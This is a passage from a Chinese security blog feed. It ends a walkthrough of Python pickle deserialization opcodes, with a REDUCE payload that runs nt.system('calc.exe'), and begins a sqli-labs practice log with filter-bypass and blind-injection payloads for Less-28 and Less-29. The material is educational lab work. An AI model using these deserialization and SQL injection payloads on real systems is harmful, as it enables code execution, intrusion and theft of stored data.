&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="appends">APPENDS&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 10: K BININT1 3
12: e APPENDS (MARK at 5)
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">load_appends&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">items&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pop_mark&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="n">list_obj&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">extend&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">list_obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">extend&lt;/span>
&lt;span class="k">except&lt;/span> &lt;span class="ne">AttributeError&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">pass&lt;/span>
&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">extend&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">items&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="c1"># Even if the PEP 307 requires extend() and append() methods,&lt;/span>
&lt;span class="c1"># fall back on append() if the object has no extend() method&lt;/span>
&lt;span class="c1"># for backward compatibility.&lt;/span>
&lt;span class="n">append&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">list_obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">item&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">items&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">item&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">APPENDS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_appends&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>appends&lt;/code>将&lt;code>memo&lt;/code>中保存的前一个栈弹出，然后把当前栈上的所有值压到前一个栈顶的空列表中。如此就成功得到了我们输入的列表。&lt;/p>
&lt;h4 id="stop">STOP&lt;/h4>
&lt;p>最后的 &lt;code>STOP&lt;/code> 指令没有操作数。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">load_stop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">value&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pop&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">raise&lt;/span> &lt;span class="n">_Stop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">STOP&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_stop&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>效果也很简单，将栈顶的对象弹出，这个对象就是最终被 pickle 恢复完成的对象了。&lt;/p>
&lt;h3 id="rce利用">RCE利用&lt;/h3>
&lt;p>pickle 的反序列化任意代码执行漏洞来自 pickle 序列化/反序列化实例的一种约定，即&lt;code>__reduce__&lt;/code>魔术方法。&lt;/p>
&lt;p>对自定义类的实例，pickle 没法保证一定能还原出原对象。比如类里包含一个打开了的文件描述符，fd是没法保存的，程序一重启先前保存的 fd 就失效了，如果要恢复唯一的办法就是重新打开一次，或重新构造一次这个实例。&lt;/p>
&lt;p>提供 &lt;code>__reduce__&lt;/code> 魔术方法以允许 pickle 将当前对象转为一系列构造和恢复实例所需的参数：类型、构造参数、状态参数等。&lt;/p>
&lt;p>一般对 &lt;code>__reduce__&lt;/code> 的利用就是构造参数的部分，将构造方法指定为 &lt;code>os.system&lt;/code> 即可执行任意命令。&lt;/p>
&lt;p>同样这里提供一个例子，在反序列化时会弹出计算器。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20220624175833655.png"
width="1573"
height="581"
srcset="https://nnnewb.github.io/blog/blog/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20220624175833655_hub937d7691963b68ff3337ee6eb814a2f_51193_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20220624175833655_hub937d7691963b68ff3337ee6eb814a2f_51193_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220624175833655"
class="gallery-image"
data-flex-grow="270"
data-flex-basis="649px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 0: \x80 PROTO 3
2: c GLOBAL &amp;#39;nt system&amp;#39;
13: q BINPUT 0
15: X BINUNICODE &amp;#39;calc.exe&amp;#39;
28: q BINPUT 1
30: \x85 TUPLE1
31: q BINPUT 2
33: R REDUCE
34: q BINPUT 3
36: . STOP
highest protocol among opcodes = 2
None
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>接着我们具体分析我们没见过的指令。&lt;/p>
&lt;h4 id="global">GLOBAL&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">load_global&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">module&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">readline&lt;/span>&lt;span class="p">()[:&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">readline&lt;/span>&lt;span class="p">()[:&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">klass&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">find_class&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">module&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">klass&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">GLOBAL&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_global&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>global 指令查找指定的模块，注意&lt;code>find_class&lt;/code>并不&lt;strong>只&lt;/strong>找类，函数也能被找出来。这一条指令执行后，栈顶保存的就是 &lt;code>nt.system&lt;/code> 了。&lt;/p>
&lt;h4 id="binunicode">BINUNICODE&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 13: q BINPUT 0
15: X BINUNICODE &amp;#39;calc.exe&amp;#39;
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在&lt;code>BINPUT&lt;/code>把&lt;code>nt.system&lt;/code>所在的栈记到 &lt;code>memo[0]&lt;/code> 后，是一个 &lt;code>BINUNICODE&lt;/code>。&lt;/p>
&lt;p>和&lt;code>BININT&lt;/code>差不多，压栈一个unicode字符串。&lt;/p>
&lt;h4 id="tuple1">TUPLE1&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 28: q BINPUT 1
30: \x85 TUPLE1
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>再次更换栈，&lt;code>TUPLE1&lt;/code>从栈顶构造一个元组。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">load_tuple1&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],)&lt;/span>
&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">TUPLE1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_tuple1&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这一步将刚压栈的&lt;code>calc.exe&lt;/code>构造成了&lt;code>('calc.exe',)&lt;/code>。&lt;/p>
&lt;h4 id="reduce">REDUCE&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 31: q BINPUT 2
33: R REDUCE
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>将刚构造好的元组记录到&lt;code>memo[2]&lt;/code>后，开始 &lt;code>REDUCE&lt;/code> 指令。正是这一步触发了任意代码执行。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">REDUCE&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;R&amp;#39;&lt;/span> &lt;span class="c1"># apply callable to argtuple, both on stack&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">load_reduce&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">stack&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span>
&lt;span class="n">args&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">stack&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pop&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="n">func&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">stack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="n">stack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">REDUCE&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_reduce&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这段代码中&lt;code>args&lt;/code>是我们刚构造好的&lt;code>('calc.exe',)&lt;/code>，&lt;code>func&lt;/code>是&lt;code>nt.system&lt;/code>，这个函数的调用结果成为最后留在栈里的对象。&lt;/p>
&lt;p>而我们的恶意代码（弹计算器）也执行了。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2></description></item><item><title>sqli-labs 实验记录 #5</title><link>https://nnnewb.github.io/blog/p/sqli-labs-training-5/</link><pubDate>Fri, 13 May 2022 15:04:43 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/sqli-labs-training-5/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>惯例。&lt;/p>
&lt;p>随便刷两题。&lt;/p>
&lt;h2 id="less-28">Less-28&lt;/h2>
&lt;p>没有错误回显，有查询结果。提示 all your &amp;lsquo;union&amp;rsquo; and &amp;lsquo;select&amp;rsquo; belongs to us ，和 27 一样的提示，不同的是 union 和 select 加了引号。不知道想表达什么。&lt;/p>
&lt;p>验证注入类型 &lt;code>?id=1' and '1'='1&lt;/code> + &lt;code>?id=1' and '1'='0&lt;/code> 确定是字符型注入，单引号。注意服务端可能有个类型转换导致 &lt;code>1 and 1=1&lt;/code> 这样的 payload 也有回显，通过构造为假的条件可以发现并不是数字型注入。&lt;/p>
&lt;p>从提示看是过滤了 union 和 select 但不知道怎么过滤的，尝试双写 bypass，发现空格被过滤了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513094655242.png"
width="1172"
height="244"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513094655242_huccd33fbbc1c70cf92076cd51502fa4a4_26879_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513094655242_huccd33fbbc1c70cf92076cd51502fa4a4_26879_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220513094655242"
class="gallery-image"
data-flex-grow="480"
data-flex-basis="1152px"
>&lt;/p>
&lt;p>尝试&lt;code>/**/&lt;/code>替换空格 bypass ，发现依然无效。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513094741744.png"
width="1158"
height="246"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513094741744_hu4e8d6554a01e98a5ba4e8a820ad268ce_27124_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513094741744_hu4e8d6554a01e98a5ba4e8a820ad268ce_27124_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220513094741744"
class="gallery-image"
data-flex-grow="470"
data-flex-basis="1129px"
>&lt;/p>
&lt;p>尝试 &lt;code>0xa0&lt;/code> 替换空格。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513095047414.png"
width="1200"
height="252"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513095047414_hue2fb6ad088b6e55ab603e637b9a99ad0_33575_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513095047414_hue2fb6ad088b6e55ab603e637b9a99ad0_33575_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220513095047414"
class="gallery-image"
data-flex-grow="476"
data-flex-basis="1142px"
>&lt;/p>
&lt;p>看起来ok了，但看起来完全没过滤 union 和 select ，把双写去除后重试，依然没有回显，茫然。&lt;/p>
&lt;p>好吧，重新整理思路。先测试下过滤了什么东西 &lt;code>?id=0'&amp;quot;;--%23/**/union,select&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513095828806.png"
width="1045"
height="254"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513095828806_hu3b595d65dcd9cc8de4a1ce7526d0d3b1_23651_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513095828806_hu3b595d65dcd9cc8de4a1ce7526d0d3b1_23651_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220513095828806"
class="gallery-image"
data-flex-grow="411"
data-flex-basis="987px"
>&lt;/p>
&lt;p>注意到只剩下了 &lt;code>'&amp;quot;;&lt;/code> 幸存，前面有个双写和&lt;code>%a0union%a0&lt;/code>没被替换，所以初步怀疑正则可能是&lt;code>\b(union|select)\b&lt;/code>。尝试大小写也被过滤了，所以正则匹配应该还有个 &lt;code>i&lt;/code> 标志。&lt;/p>
&lt;p>这种情况我有个思路是走盲注，用&lt;code>AND IF(...)&lt;/code>爆破。尝试&lt;code>?id=1'%a0and%a0if(ascii(substring(password,1,1))&amp;gt;0,true,false)%a0and%a0'1'='1&lt;/code> 有回显，条件改成&lt;code>&amp;lt;0&lt;/code>则无回显。继续爆破即可。&lt;/p>
&lt;p>再给其他人的思路参考：&lt;/p>
&lt;ul>
&lt;li>审阅代码可知正则并不是我猜测的&lt;code>\b(union|select)\b&lt;/code>，而是&lt;code>union\s+select&lt;/code>，因此可以被&lt;code>%a0&lt;/code>绕过，正常&lt;code>union select&lt;/code> 或者 &lt;code>union all select&lt;/code> 可破。&lt;/li>
&lt;/ul>
&lt;h2 id="less-29">Less-29&lt;/h2>
&lt;p>提示 protection with WAF, this site protected by world&amp;rsquo;s best firewall.&lt;/p>
&lt;p>测试过滤了什么东西。&lt;code>?id=1'&amp;quot;;--%23/**/%20select,union,and,or,SeLect,UniOn,seselectlect,uniunionon&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513103434746.png"
width="1734"
height="89"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513103434746_hubce0d817c4d63d33fd9ff2720c3a3d00_13380_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513103434746_hubce0d817c4d63d33fd9ff2720c3a3d00_13380_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220513103434746"
class="gallery-image"
data-flex-grow="1948"
data-flex-basis="4675px"
>&lt;/p>
&lt;p>发现什么都没过滤，看起来是单引号字符型注入。尝试 Less-28 的盲注 payload 发现成功。什么鬼？&lt;/p>
&lt;p>尝试 &lt;code>?id=0' union select 1,version(),database() --%20&lt;/code> 发现也直接成功。&lt;/p>
&lt;p>WAF，看看你都保护了个啥。&lt;/p>
&lt;h3 id="waf设置">WAF设置&lt;/h3>
&lt;p>经查，原来是我挑的这个分支 docker-compose 部署有问题=。=&lt;/p>
&lt;p>WAF 并不属于 PHP，而是 jsp 的，在仓库目录下有个 &lt;code>tomcat.zip&lt;/code> 保存了 WAF 的内容，需要单独部署。&lt;/p>
&lt;p>参考&lt;a class="link" href="https://www.jianshu.com/p/46cb6c354de5" target="_blank" rel="noopener"
>sqli-labs: Less-29 - Less-31&lt;/a> 这篇文章了解到架构大体上就是 tomcat 过滤参数后反代 apache 服务，但仔细看了下 WAF 内容发现没有对 Less-29~Less-32 之外的页面反代，导致把 tomcat 挂在 80 端口的话就访问不到其他没设置 WAF 的页面。&lt;/p>
&lt;p>合理的架构应该是这样。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513135801459.png"
width="644"
height="270"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513135801459_hu920b318a879aa14835f862755577c731_27482_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-5/image-20220513135801459_hu920b318a879aa14835f862755577c731_27482_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220513135801459"
class="gallery-image"
data-flex-grow="238"
data-flex-basis="572px"
>&lt;/p>
&lt;p>修改 &lt;code>docker-compose.yaml&lt;/code> 如下&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">version&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;3&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">services&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">reverseproxy&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;nginx:mainline&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">depends_on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
